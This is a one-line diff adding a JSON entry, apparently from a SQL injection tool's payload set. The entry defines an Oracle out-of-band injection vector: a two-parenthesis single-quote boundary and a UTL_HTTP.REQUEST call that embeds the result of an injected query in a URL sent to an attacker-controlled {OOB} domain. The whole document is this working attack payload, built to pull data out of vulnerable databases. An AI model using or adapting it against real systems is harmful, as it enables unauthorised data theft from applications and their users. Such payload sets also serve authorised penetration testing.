@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "oob", "boundary": {"prefix": "')) ", "suffix": "-- -", "type": "paren2-single-ws"}, "vector": "{B} AND (SELECT UTL_HTTP.REQUEST('http://'||({Q})||'.{OOB}/') FROM dual)", "comment": "oracle oob: single in 2 parens ws"}
